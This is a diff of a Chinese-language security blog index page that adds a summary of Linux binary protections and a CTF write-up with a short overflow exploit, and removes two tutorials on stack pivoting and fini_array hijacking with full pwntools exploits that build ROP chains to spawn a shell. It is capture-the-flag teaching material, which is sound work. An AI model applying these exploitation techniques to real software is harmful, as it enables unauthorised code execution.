@@ -155,6 +155,154 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/17/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">Linux保护技术</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-17 16:17:49" itemprop="dateCreated datePublished" datetime="2021-12-17T16:17:49+08:00">2021-12-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-21 01:03:57" itemprop="dateModified" datetime="2022-01-21T01:03:57+08:00">2022-01-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>将数据（堆、栈）所在内存页标识为不可执行，当程序尝试在数据页面上执行指令时，CPU会抛出异常而不是去执行指令。</p>
+<h5 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-z execstack</code></p>
+<p>开启：<code>-z noexecstack</code></p>
+<h3 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h3><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>使程序每次加载的基址随机化</p>
+<h5 id="编译选项-1"><a href="#编译选项-1" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-no-pie</code></p>
+<p>开启：<code>-pie-fPIC</code></p>
+<h3 id="Canary保护"><a href="#Canary保护" class="headerlink" title="Canary保护"></a>Canary保护</h3><h5 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h5><p>函数开始执行时往栈上插入Canary值，并在函数返回的时候检查Canary的值是否有变动，如果有则调用 <code>__stack_check_fail</code> 函数强行停止程序。</p>
+<h5 id="编译选项-2"><a href="#编译选项-2" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-fno-stack-protector</code></p>
+<p>部分启用（只为局部变量中含有 char 的函数插入Canary）：<code>-fstack-protector</code></p>
+<p>全局启用（为所有函数插入Canary）：<code>-fstack-protector-all</code></p>
+<h3 id="Fortify保护"><a href="#Fortify保护" class="headerlink" title="Fortify保护"></a>Fortify保护</h3><h5 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h5><p>主要用来防止格式化字符串漏洞。包含 <code>%n</code> 的格式化字符串不能位于程序内存中的可写地址。当使用位置参数时，必须使用范围内的所有参数（例如要使用 <code>%7$x</code> ，则必须同时使用 1$，2$，3$……）</p>
+<h5 id="编译选项-3"><a href="#编译选项-3" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-D_FORTIFY_SOURCE = 0</code></p>
+<p>开启：<code>-D_FORTIFY_SOURCE = 2</code></p>
+<h3 id="RELRO保护"><a href="#RELRO保护" class="headerlink" title="RELRO保护"></a>RELRO保护</h3><h5 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h5><p>设置符号重定向表为<strong>只读</strong>并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击</p>
+<h5 id="编译选项-4"><a href="#编译选项-4" class="headerlink" title="编译选项"></a>编译选项</h5><p>开启（部分）：<code>-z lazy</code></p>
+<p>开启（完全）：<code>-z now</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/" class="post-title-link" itemprop="url">护网杯_2018_gettingstart</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-17 15:50:23 / 修改时间：16:00:52" itemprop="dateCreated datePublished" datetime="2021-12-17T15:50:23+08:00">2021-12-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>小数在内存中的储存</p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>main() 函数如下，题目很简单，只要利用 buf[] 的越界将 v5 和 v6 覆盖成要求值即可 </p>
+<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/main.jpg" class>
+
+<p>一开始没想到怎么将 v6 覆盖成 0.1，然后就直接开编译器查看其在内存中的存储形式，如下</p>
+<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/%E8%B0%83%E8%AF%95-1.jpg" class>
+
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26578</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3fb999999999999a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-guess/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -955,217 +1103,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/27/%E6%A0%88%E8%BF%81%E7%A7%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/27/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="post-title-link" itemprop="url">栈迁移</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-27 16:08:35" itemprop="dateCreated datePublished" datetime="2021-11-27T16:08:35+08:00">2021-11-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-11 21:37:35" itemprop="dateModified" datetime="2021-12-11T21:37:35+08:00">2021-12-11</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>当我们能利用栈溢出将 ebp 和 ret 覆盖时，我们就可以将 ebp 覆盖成某个地址，再将 ret 覆盖成 <code>leave_ret</code> 指令的地址，这样就可以利用 <code>leave_ret</code> 指令将栈迁移到我们所覆盖的地址中，大概过程如下：</p>
-<img src="/2021/11/27/%E6%A0%88%E8%BF%81%E7%A7%BB/process.jpg" class>
-
-<p>目前的理解：栈迁移主要用在溢出的长度不足以构造一条完整的rop链的时候，这时我们要是有能在别的地方构造rop链的条件，就能用栈迁移的方法将栈迁移到我们构造rop链的地方，从而完成攻击。</p>
-<h4 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h4><h5 id="程序保护如下"><a href="#程序保护如下" class="headerlink" title="程序保护如下"></a>程序保护如下</h5><img src="/2021/11/27/%E6%A0%88%E8%BF%81%E7%A7%BB/checksec.jpg" class>
-
-<h5 id="程序主逻辑如下"><a href="#程序主逻辑如下" class="headerlink" title="程序主逻辑如下"></a>程序主逻辑如下</h5><img src="/2021/11/27/%E6%A0%88%E8%BF%81%E7%A7%BB/vul.jpg" class>
-
-<h5 id="解题思路与过程"><a href="#解题思路与过程" class="headerlink" title="解题思路与过程"></a>解题思路与过程</h5><p>可以看到共有两次输入，但是两次输入的字长都为 0x30 个字节，都只能溢出 0x8 个字节，也就是只能覆盖 ebp 和 ret ，这时我们就能想到栈迁移。</p>
-<p>要利用栈迁移首先我们需要在一个地方构造 ROP 链，然后还要知道我们构造 ROP 链所在的地址，这样我们才能将 ebp 覆盖成这个地址完成栈的迁移。但是这道题的两次输入都是在 s ，也就是栈上，那么我们干脆就在栈上构造 ROP 链。</p>
-<p>既然我们选择在栈上构造 ROP 链，那就需要泄漏出栈上的地址才行，可以看到 printf() 函数会将我们的输入以字符串的形式输出，那么我们可以选择利用这个 printf() 来泄漏存在于栈上的 ebp 的地址，然后计算泄漏的 ebp 与其所在的栈地址的偏移就得到了栈的地址。</p>
-<p>printf() 的 %s 会输出到遇到 ‘\x00’ 为止，所以我们要防止 printf() 在输出 ebp 之前被截断，所以我们需要填满 ebp 之前的栈段</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">p.send(payload) <span class="comment">#注意这里不要用sendline，否则ebp有一个字节会被覆盖掉</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
-
-<p>到此我们完成了 ebp 的泄漏，然后我们计算其与所在栈地址的偏移，在第一次 printf() 处下断点观察</p>
-
-
-<p>可以看到我们泄漏的 ebp 和其在栈上的地址的偏移为 0x10 个字节，到此我们就完成了泄漏栈地址的操作，然后我们利用第二次输入来完成构造 ROP 链及栈迁移的操作。</p>
-<p>ROP链的构造：因为程序中没有 ‘/bin/sh’ 字符串，所以我们需要手动输入到栈上，并计算其所在地址（因为我们已经得到了一个栈上的地址，所以我们输入的内容在栈上的地址都可以计算相对偏移得到），构造如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack_ebp = ebp - <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span> + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;bbbb&#x27;</span> + p32(stack_ebp-<span class="number">0x18</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>构造完 ROP 链之后需要将其补齐到 0x28 个字节以便我们正确地覆盖 ebp 和 ret</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(stack_ebp-<span class="number">0x28</span>) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
-
-<p>解释payload：先输入的四个 ‘a’ 是因为栈迁移过程中 leave 会将 esp 抬高四个字节（32位），所以我们需要先将 ebp 迁移到 “要执行的指令的地址 - 4” 处，在上述payload中即 <code>stack_ebp - 0x28</code> 处（理解栈迁移的过程就能理解这一步），然后 <code>stack_ebp - 0x18</code>处就是我们输入的 ‘/bin/sh\x00’ 所在的地址，将其作为 system() 的参数以得到 shell 。</p>
-<p>当然我们也可以将payload构造成如下形式，但是原理还是一样的，所以本质没有区别</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stack_ebp = ebp - <span class="number">0x10</span></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;bbbb&#x27;</span> + p32(stack_ebp-<span class="number">0x1c</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(stack_ebp-<span class="number">0x2c</span>) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
-
-<p>完整exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line">stack_ebp = ebp-<span class="number">0x10</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span> + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;bbbb&#x27;</span> + p32(stack_ebp-<span class="number">0x18</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(stack_ebp-<span class="number">0x28</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">fini_array劫持</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-26 15:21:49" itemprop="dateCreated datePublished" datetime="2021-11-26T15:21:49+08:00">2021-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-05 02:35:02" itemprop="dateModified" datetime="2022-03-05T02:35:02+08:00">2022-03-05</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="fini-array劫持（没写完）"><a href="#fini-array劫持（没写完）" class="headerlink" title="fini_array劫持（没写完）"></a>fini_array劫持（没写完）</h2><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
-<li><p>虽然写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。其流程见于链接<a target="_blank" rel="noopener" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a></p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/fini.png" class>
-
-<p>简单地说，在main函数前会调用 <code>.init</code> 段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的，main函数结束后也会调用 <code>.fini</code> 段代码和 <code>.fini_array</code> 段的函数数组中每一个函数指针。</p>
-</li>
-<li><p>当<code>RELRO</code>保护为<code>NO RELRO</code>的时候，<code>init.array、fini.array、got.plt</code>均可读可写；</p>
-<p>为<code>PARTIAL RELRO</code>的时候，<code>ini.array、fini.array</code>可读不可写，<code>got.plt</code>可读可写；</p>
-<p>为<code>FULL RELRO</code>时，<code>init.array、fini.array、got.plt</code>均可读不可写。</p>
-</li>
-</ul>
-<p>在<code>fini_array</code> 数组中存在两个函数指针，分别指向下面两个函数：</p>
-<p>array[0]:__do_global_dtors_aux<br>array[1]:fini</p>
-<p>这两个函数都会在main函数执行完后执行，且先执行 <code>array[1]</code> 再执行 <code>array[0]</code> ，如果我们覆盖了这两个函数指针，就可以劫持程序的执行流。同时这两个函数指针在 <code>__libc_csu_fini</code> 中被执行，所以如果我们将 <code>array[0]</code> 覆盖为 <code>__libc_csu_fini</code> ，将 <code>array[1]</code> 覆盖为另一个地址A，那么按照执行顺序，在执行完main函数后，在 <code>___libc_csu_fini</code> 中执行 <code>array[1]</code> 的地址A，然后执行 <code>array[0]</code> ，显然因为 <code>array[0]</code> 被覆盖成了 <code>__libc_csu_fini</code> ，所以程序会再次执行地址A……，如下图</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/fini-1.jpg" class>
-
-<p>显然，如果 <code>array[0]</code> 中的 <code>__libc_csu_fini</code> 不变，地址A就会无限次执行，如果地址A中存在有限字节的任意地址写，那么我们就可以通过这个循环实现无限字节的任意地址写。</p>
-<p>在 <code>__libc_csu_fini</code>函数中有这样一句代码 <code>.text:0000000000402968                 lea     rbp, fini_array_0</code>，其将rbp修改为 <code>fini_array_0</code> 的首地址，所以我们就可以配合 <code>leave;ret</code> 和 <code>ret</code> 指令将栈迁移至 <code>fini_array</code> 中。</p>
-<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ol>
-<li>将 <code>fini_array_0</code> 修改为<code> __libc_csu_fini</code> 的地址，将<code> fini_array_1</code> 修改为<code>func()</code></li>
-<li>利用 <code>func()</code> 中存在的任意地址写，在 <code>fini_array + 0x10</code> 处构造ROP链</li>
-<li>将 <code>fini_array_0</code> 修改为 <code>leave_ret</code> ，将 <code>fini_array_1</code> 修改为 <code>ret</code></li>
-</ol>
-<h4 id="在-fini-array-0x10-处构造ROP链的解释"><a href="#在-fini-array-0x10-处构造ROP链的解释" class="headerlink" title="在 fini_array + 0x10 处构造ROP链的解释"></a>在 fini_array + 0x10 处构造ROP链的解释</h4><p>我们构造完ROP链后有两种方法将栈迁移至 <code>fini_array</code> </p>
-<h5 id="方法一：在-fini-array-0-处迁移栈"><a href="#方法一：在-fini-array-0-处迁移栈" class="headerlink" title="方法一：在 fini_array[0] 处迁移栈"></a>方法一：在 fini_array[0] 处迁移栈</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fini_array + 0x0: (gadget)leave_ret</span><br><span class="line">fini_array + 0x8: (gadget)ret</span><br><span class="line">fini_array + 0x10: ROP chain</span><br></pre></td></tr></table></figure>
-
-<p>我们利用循环构造完ROP链之后，在下一次循环中需要将 fini_array[0] 和 fini_array[1] 分别修改为 leave_ret 和 ret ，修改完后此时循环从 fini_array[1] =&gt; fini_array[0] 中，因为在上一次循环中 __libc_csu_fini 会将 rbp 迁移到 fini_array 的首地址，所以程序在这一步执行的 fini_array[0] 中的 leave_ret 会将 rsp 迁移到 fini_array + 0x10 的位置中，同时 rip 被修改为 ret，所以再执行完 ret 后，位于 fini_array + 0x10 处的ROP链就被 pop 到了 rip 中，这样就能执行完我们的ROP链。图示如下：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/fini-p1.jpg" class>
-
-
-
-<h5 id="方法二：在-fini-array-1-处迁移栈（需要迁移两次）"><a href="#方法二：在-fini-array-1-处迁移栈（需要迁移两次）" class="headerlink" title="方法二：在 fini_array[1] 处迁移栈（需要迁移两次）"></a>方法二：在 fini_array[1] 处迁移栈（需要迁移两次）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fini_array + 0x0: (data)fini_array+0x8</span><br><span class="line">fini_array + 0x8: (gadget)leave_ret</span><br><span class="line">fini_array + 0x10: rop chain</span><br></pre></td></tr></table></figure>
-
-<h4 id="一道例题（DASCTF-—-Memory-Monster-II）"><a href="#一道例题（DASCTF-—-Memory-Monster-II）" class="headerlink" title="一道例题（DASCTF — Memory Monster II）"></a>一道例题（DASCTF — Memory Monster II）</h4><p>程序保护如下：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/checksec.png" class>
-
-<p>这是一道静态链接的题目，同时符号表被删除了，start()函数如下：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/start.jpg" class>
-
-<p>我们知道start()的第一个参数是main()，第四个参数是 __libc_csu_init，第五个参数是 _libc_csu_fini，所以我们可以找到这三个函数。</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/start-1.jpg" class>
-
-<p>main()函数如下（给函数改了名方便阅读）：</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/main.jpg" class>
-
-<p>可以看到main()中实际是存在Canary的，同时存在程序给的任意地址写，所以我们可以利用这个任意地址写来构造ROP链。因为是静态链接的题目，所以我们可以找到我们所需要的gadget来构造系统调用。显然 0x18 个字节的任意地址写远不够我们使用，所以我们可以劫持 fini_array 来重复使用程序的这段任意地址写来将ROP链构造完成。相关细节在前面已经说过，这里不再赘述，exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p = process(&quot;./2&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">fini_array = 0x4B80B0</span><br><span class="line">_libc_csu_fini = 0x402CB0</span><br><span class="line">main = 0x401C1D</span><br><span class="line">ret = 0x401016</span><br><span class="line">pop_rdx = 0x448415</span><br><span class="line">pop_rsi = 0x406f80</span><br><span class="line">pop_rdi = 0x401746</span><br><span class="line">leave_ret = 0x401cf3</span><br><span class="line">pop_rax = 0x448fcc</span><br><span class="line">binsh = 0x492895</span><br><span class="line">syscall = 0x402514</span><br><span class="line"></span><br><span class="line">def write(addr,data):</span><br><span class="line">    p.sendlineafter(&quot;addr:&quot;,p64(addr))</span><br><span class="line">    p.sendafter(&quot;data:&quot;,data)</span><br><span class="line">    </span><br><span class="line">p1 = p64(_libc_csu_fini) + p64(main)</span><br><span class="line">write(fini_array,p1)</span><br><span class="line">p2 = flat(pop_rax,59,pop_rdi)</span><br><span class="line">write(fini_array + 0x10,p2)</span><br><span class="line">p3 = flat(binsh,pop_rsi,0)</span><br><span class="line">write(fini_array + 0x10 + 0x18,p3)</span><br><span class="line">p4 = flat(pop_rdx,0,syscall)</span><br><span class="line">write(fini_array + 0x10 + 0x18 + 0x18,p4)</span><br><span class="line"></span><br><span class="line">p5 = flat(leave_ret,ret)</span><br><span class="line">write(fini_array,p5)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>syscall指令可以在IDA中 alt + t 找到</p>
-<img src="/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/find.jpg" class>
-
-<p>一个小问题：往地址中写入值的时候不能用”sendline”，因为这会往地址中写入一个回车，造成错误</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1235,14 +1172,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">60</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
